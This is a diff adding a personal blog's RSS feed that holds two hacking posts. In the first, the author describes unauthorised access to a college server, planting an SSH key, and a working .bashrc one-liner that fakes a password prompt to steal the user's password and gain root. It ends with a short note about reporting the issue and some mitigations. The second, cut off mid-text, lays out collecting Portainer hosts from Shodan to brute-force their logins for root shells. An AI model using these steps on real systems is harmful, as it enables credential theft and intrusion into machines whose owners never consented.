@@ -1,0 +1,1700 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Gill.Singh.A</title>
+        <link>http://localhost:1313/</link>
+        <description>Recent content on Gill.Singh.A</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Mon, 23 Sep 2024 05:28:07 +0530</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Using Social Engineering for Privilege Escalation</title>
+        <link>http://localhost:1313/p/using-social-engineering-for-privilege-escalation/</link>
+        <pubDate>Mon, 23 Sep 2024 05:28:07 +0530</pubDate>
+        
+        <guid>http://localhost:1313/p/using-social-engineering-for-privilege-escalation/</guid>
+        <description>&lt;img src="http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt.png" alt="Featured image of post Using Social Engineering for Privilege Escalation" /&gt;&lt;h2 id=&#34;prologue&#34;&gt;Prologue
+&lt;/h2&gt;&lt;p&gt;While exploring devices on my college network, I managed to gain Remote Desktop Access to a server for one of our institute&amp;rsquo;s websites. The method I used to obtain access to the interface is out of the scope of this blog.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/remote_desktop_interface.png&#34;
+	width=&#34;1042&#34;
+	height=&#34;779&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/remote_desktop_interface_hu3798650764409171018.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/remote_desktop_interface_hu4295186151521413508.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Remote Desktop Access&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;133&#34;
+		data-flex-basis=&#34;321px&#34;
+	
+&gt;&lt;br /&gt;
+Upon gaining access, I found that the server was running &lt;strong&gt;Ubuntu&lt;/strong&gt;. The terminal displayed &lt;strong&gt;user&lt;/strong&gt; as the current user.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/current_user.png&#34;
+	width=&#34;1038&#34;
+	height=&#34;778&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/current_user_hu18328591220318913029.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/current_user_hu7294103013318607692.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Terminal&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;133&#34;
+		data-flex-basis=&#34;320px&#34;
+	
+&gt;&lt;br /&gt;
+I added my public key to &lt;em&gt;/home/user/.ssh/authorized_keys&lt;/em&gt; and checked the SSH connection.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/user_ssh_connection.png&#34;
+	width=&#34;715&#34;
+	height=&#34;502&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/user_ssh_connection_hu10281628265701383641.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/user_ssh_connection_hu7560144399843845447.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;User SSH Connection&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;142&#34;
+		data-flex-basis=&#34;341px&#34;
+	
+&gt;&lt;br /&gt;
+With SSH access confirmed, it was time to escalate our privileges to the &lt;em&gt;&lt;strong&gt;root&lt;/strong&gt;&lt;/em&gt; user.&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation
+&lt;/h2&gt;&lt;p&gt;Initially, I explored various SUIDs, SGIDs, Cronjob Files, the Shadow File, shared libraries, and other system components to find potential vulnerabilities. &lt;br /&gt;
+After finding no useful exploits, I downloaded and executed &lt;a class=&#34;link&#34; href=&#34;https://github.com/peass-ng/PEASS-ng&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;linPEAS&lt;/a&gt; to search for additional attack surfaces, but it was not successful.&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;social-engineering&#34;&gt;Social Engineering
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;&amp;ldquo;I&amp;rsquo;M GOOD AT READING PEOPLE. MY SECRET. I LOOK FOR THE WORST IN THEM.&amp;rdquo; - Mr.Robot&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;!-- --&gt;
+&lt;p&gt;This line from Mr. Robot inspired me after my initial methods for privilege escalation failed.&lt;br /&gt;
+I devised a strategy to obtain the password for &lt;strong&gt;user&lt;/strong&gt; using a social engineering approach.&lt;br /&gt;
+I created a single-line bash script to be appended to &lt;em&gt;/home/user/.bashrc&lt;/em&gt;.&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s1&#34;&gt;&amp;#39;password for user: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; -s password&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 &amp;gt;/tmp/tmp.txt&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; grep -v &lt;span class=&#34;s1&#34;&gt;&amp;#39;random_signature&amp;#39;&lt;/span&gt; /home/user/.bashrc &amp;gt;/tmp/tmp&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; mv /tmp/tmp /home/user/.bashrc&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; chmod &lt;span class=&#34;m&#34;&gt;644&lt;/span&gt; ~/.bashrc&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s Understand this command-by-command&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Prints &lt;strong&gt;password for user:&lt;/strong&gt; on the screen, tricking the user into thinking it’s a prompt for their password.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s1&#34;&gt;&amp;#39;password for user: &amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Inputs the password in silent mode, so it doesn’t appear on the screen.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; -s password
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Encodes the password in &lt;strong&gt;base64&lt;/strong&gt; and saves it to &lt;em&gt;/tmp/tmp.txt&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 &amp;gt;/tmp/tmp.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Removes lines containing &lt;strong&gt;random_signature&lt;/strong&gt; from &lt;em&gt;/home/user/.bashrc&lt;/em&gt;, ensuring it doesn’t affect the file’s functionality.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;grep -v &lt;span class=&#34;s1&#34;&gt;&amp;#39;random_signature&amp;#39;&lt;/span&gt; /home/user/.bashrc &amp;gt;/tmp/tmp
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Replaces the original &lt;strong&gt;.bashrc&lt;/strong&gt; file with the modified version.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mv /tmp/tmp /home/user/.bashrc
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Restores the original file permissions for &lt;strong&gt;.bashrc&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;644&lt;/span&gt; ~/.bashrc
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;After appending this line to &lt;em&gt;/home/user/.bashrc&lt;/em&gt;, every time a new terminal was opened, it would prompt the &lt;strong&gt;user&lt;/strong&gt; for their password.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt.png&#34;
+	width=&#34;890&#34;
+	height=&#34;390&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt_hu9311836505811142885.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt_hu15260579389586501392.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Password Prompt&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;228&#34;
+		data-flex-basis=&#34;547px&#34;
+	
+&gt;&lt;br /&gt;
+Once the user entered their password, the line would be removed from &lt;strong&gt;.bashrc&lt;/strong&gt;, restoring the file to its original state. I could then SSH into the machine and retrieve the base64 encoded password from &lt;em&gt;/tmp/tmp.txt&lt;/em&gt;.&lt;br /&gt;
+Although there were concerns about potential failures, such as entering the wrong password or pressing &lt;strong&gt;CTRL+C&lt;/strong&gt;, the method worked successfully after a few days.&lt;/p&gt;
+&lt;h2 id=&#34;obtaining-password&#34;&gt;Obtaining Password
+&lt;/h2&gt;&lt;p&gt;A few days later, I logged in as &lt;strong&gt;user&lt;/strong&gt; via SSH and found that it wasn’t prompting for a password. I checked &lt;em&gt;/tmp/tmp.txt&lt;/em&gt; and found the base64 encoded password.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_password.png&#34;
+	width=&#34;610&#34;
+	height=&#34;384&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_password_hu15247351470866518167.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_password_hu12880556767352814779.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Base64 Encoded Password&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;158&#34;
+		data-flex-basis=&#34;381px&#34;
+	
+&gt;&lt;br /&gt;
+After Decoding it, I obtained the password.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_decoding.png&#34;
+	width=&#34;568&#34;
+	height=&#34;119&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_decoding_hu4472420002180516116.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_decoding_hu1426856767055626827.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Base64 Decoding&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;477&#34;
+		data-flex-basis=&#34;1145px&#34;
+	
+&gt;&lt;br /&gt;
+Finally, I verified the success of my social engineering method by checking for root access.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/sudo_bash.png&#34;
+	width=&#34;190&#34;
+	height=&#34;40&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/sudo_bash_hu15170616915056937535.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/sudo_bash_hu4895617423315236842.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Sudo Bash&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;475&#34;
+		data-flex-basis=&#34;1140px&#34;
+	
+&gt;&lt;br /&gt;
+There We have the &lt;strong&gt;root&lt;/strong&gt; user!&lt;/p&gt;
+&lt;h2 id=&#34;reporting&#34;&gt;Reporting
+&lt;/h2&gt;&lt;p&gt;As a responsible and ethical individual, I reported the findings to the concerned authorities. They have since addressed and fixed the issues discussed.&lt;/p&gt;
+&lt;h2 id=&#34;mitigations&#34;&gt;Mitigations
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Social Engineering&lt;/strong&gt; remains one of the most dangerous methods of compromising security because it exploits human psychology rather than technical vulnerabilities. The weakest link in any security system is often the human element. Even the most secure systems can be breached if someone is tricked into revealing sensitive information or executing malicious commands.&lt;br /&gt;
+To mitigate the risk of social engineering attacks:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Security Awareness Training&lt;/strong&gt;: Regularly train employees to recognize and respond to social engineering tactics.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Verification Procedures&lt;/strong&gt;: Implement strict verification processes for sensitive actions or information requests.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Multi-Factor Authentication (MFA)&lt;/strong&gt;: Use MFA to add an extra layer of security beyond just passwords.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Monitor and Audit&lt;/strong&gt;: Regularly monitor and audit access logs for suspicious activity.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- --&gt;
+&lt;p&gt;By addressing these areas, you can significantly reduce the risk posed by social engineering and other similar attacks.&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Getting Remote Root Shell on Devices via Portainer</title>
+        <link>http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/</link>
+        <pubDate>Mon, 23 Sep 2024 05:21:38 +0530</pubDate>
+        
+        <guid>http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/</guid>
+        <description>&lt;img src="http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/main_image.png" alt="Featured image of post Getting Remote Root Shell on Devices via Portainer" /&gt;&lt;h2 id=&#34;portainer&#34;&gt;Portainer
+&lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.portainer.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Portainer&lt;/a&gt; is an open-source management tool designed for containers. It offers a user-friendly, lightweight web interface that simplifies the deployment and management of Docker environments. It&amp;rsquo;s important to note that while Portainer itself does not run with root privileges, if the Docker service managed by Portainer operates with root permissions, it could potentially lead to a remote root shell vulnerability, as discussed further.&lt;/p&gt;
+&lt;h2 id=&#34;information-gathering&#34;&gt;Information Gathering
+&lt;/h2&gt;&lt;h3 id=&#34;collecting-target-devices&#34;&gt;Collecting Target Devices
+&lt;/h3&gt;&lt;p&gt;We&amp;rsquo;ll use &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Shodan Search Engine&lt;/a&gt; to Collect Target Devices.&lt;br /&gt;
+On &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Shodan Search Engine&lt;/a&gt; search with query &lt;em&gt;product:portainer&lt;/em&gt;, this would list out all the Devices that were identified running Portainer by Shodan.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_search.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_search_hu5065758196418204342.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_search_hu3985421631415068294.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Shodan Search&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;
+After setting the requeired filters, we can download the results.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_download_results.png&#34;
+	width=&#34;715&#34;
+	height=&#34;56&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_download_results_hu2063741215654517212.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_download_results_hu6580981014759218426.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Shodan Download Results&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1276&#34;
+		data-flex-basis=&#34;3064px&#34;
+	
+&gt;&lt;br /&gt;
+The Number of Results that can be downloaded depends upon your query credits available(1 Query Credit = 100 Results)&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_download_results_1.png&#34;
+	width=&#34;1233&#34;
+	height=&#34;487&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_download_results_1_hu14804659552564800396.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_download_results_1_hu13959971194765878774.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Shodan Download Results&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;253&#34;
+		data-flex-basis=&#34;607px&#34;
+	
+&gt;&lt;br /&gt;
+After Shodan has done compiling the data, it sends us a Mail that &lt;em&gt;Data is ready for Download&lt;/em&gt; or we can alernatively wait on &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io/download&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Shodan Download Page&lt;/a&gt; while the data is being compiled&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_mail.png&#34;
+	width=&#34;1034&#34;
+	height=&#34;530&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_mail_hu8959094722694699415.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_mail_hu11703782515361506775.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Shodan Download Mail&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;195&#34;
+		data-flex-basis=&#34;468px&#34;
+	
+&gt;&lt;br /&gt;
+The Download will be in the format &lt;em&gt;.json.gz&lt;/em&gt;. Shodan provides a Command-Line Utility to Parse the data in these download files.&lt;br /&gt;
+The utility can be installed with the command&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install shodan
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;The Targets from the downloaded file can be extracted with the following command&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shodan parse --fields ip_str,port --separator : &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;file_name&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;.json.gz
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;To save the Targets to a file, simply redirect the output of the command&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shodan parse --fields ip_str,port --separator : &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;file_name&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;.json.gz &amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;file_name_to_save_targets_to&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;I sometimes manually filterout some IPs by running a port scan, because sometimes the information provided by Shodan for some Devices is outdated.&lt;/p&gt;
+&lt;h3 id=&#34;compiling-a-suitable-wordlist-for-brute-force&#34;&gt;Compiling a suitable Wordlist for Brute-Force
+&lt;/h3&gt;&lt;p&gt;We can search for various Default/Weak Credentials Online. One of the best Repositories that I find for collecting Passwords for Brute-Force is &lt;a class=&#34;link&#34; href=&#34;https://github.com/danielmiessler/SecLists&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;SecLists&lt;/a&gt;.&lt;br /&gt;
+Here, I won&amp;rsquo;t disclose more information about the wordlists that I use.&lt;/p&gt;
+&lt;h2 id=&#34;brute-force&#34;&gt;Brute Force
+&lt;/h2&gt;&lt;p&gt;To access the Portainer Dashboard, we first have to find correct credentials.&lt;br /&gt;
+After collecting Target Devices and Passwords, we&amp;rsquo;re ready to do a Brute-Force attack on the Portainer Web Interface.&lt;br /&gt;
+I use &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/Portainer-Brute-Force&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
